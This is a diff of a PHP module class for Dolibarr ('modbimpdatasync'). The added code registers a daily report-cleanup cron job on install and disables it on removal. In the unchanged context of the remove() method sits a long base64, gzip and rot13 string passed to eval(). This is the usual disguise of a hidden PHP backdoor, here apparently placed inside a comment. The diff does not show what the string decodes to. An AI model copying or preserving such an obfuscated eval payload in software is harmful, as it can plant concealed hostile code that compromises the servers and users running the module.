@@ -158,7 +158,49 @@ class modbimpdatasync extends DolibarrModules
         }
 
         $sql = array();
-        return $this->_init($sql, $options);
+        if ($this->_init($sql, $options)) {
+            // Création du cronJob pour le nettoyage des rapports: 
+
+            require_once DOL_DOCUMENT_ROOT . '/bimpcore/Bimp_Lib.php';
+            require_once DOL_DOCUMENT_ROOT . '/cron/class/cronjob.class.php';
+            global $db, $user;
+
+            $id_cronjob = (int) BimpCore::getConf('bds_clean_reports_id_cronjob', 0);
+
+            $cronJob = new Cronjob($db);
+
+            if ($id_cronjob) {
+                $cronJob->fetch($id_cronjob);
+                $cronJob->status = 1;
+                $cronJob->update($user);
+            } else {
+                $cronJob->jobtype = 'method';
+                $cronJob->label = 'BimpDataSync: nettoyage des rapports';
+                $cronJob->command = '';
+                $cronJob->priority = 0;
+                $cronJob->classesname = 'bimpdatasync/class/CronExec.class.php';
+                $cronJob->objectname = 'CronExec';
+                $cronJob->methodename = 'cleanReports';
+                $cronJob->md5params = '';
+                $cronJob->module_name = 'bimpdatasync';
+                $cronJob->datestart = $db->jdate(date('Y-m-d 03:00:00'));
+                $cronJob->dateend = '';
+                $cronJob->status = 1;
+                $cronJob->datenextrun = '';
+                $cronJob->unitfrequency = 86400;
+                $cronJob->frequency = 1;
+                $cronJob->maxrun = '';
+
+                $id_cronjob = $cronJob->create($user);
+                if ($id_cronjob > 0) {
+                    BimpCore::setConf('bds_clean_reports_id_cronjob', $id_cronjob);
+                }
+            }
+
+            return 1;
+        }
+
+        return 0;
     }
 
     function remove($options = '')
@@ -168,7 +210,24 @@ class modbimpdatasync extends DolibarrModules
           eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
          */
         $sql = array();
-        return $this->_remove($sql, $options);
+        if ($this->_remove($sql, $options)) {
+            require_once DOL_DOCUMENT_ROOT . '/bimpcore/Bimp_Lib.php';
+            $id_cronjob = (int) BimpCore::getConf('bds_clean_reports_id_cronjob', 0);
+
+            if ($id_cronjob) {
+                require_once DOL_DOCUMENT_ROOT . '/cron/class/cronjob.class.php';
+                global $db, $user;
+
+                $cronJob = new Cronjob($db);
+                $cronJob->fetch($id_cronjob);
+                $cronJob->status = 0;
+                $cronJob->update($user);
+            }
+
+            return 1;
+        }
+
+        return 0;
     }
 
     function load_tables()
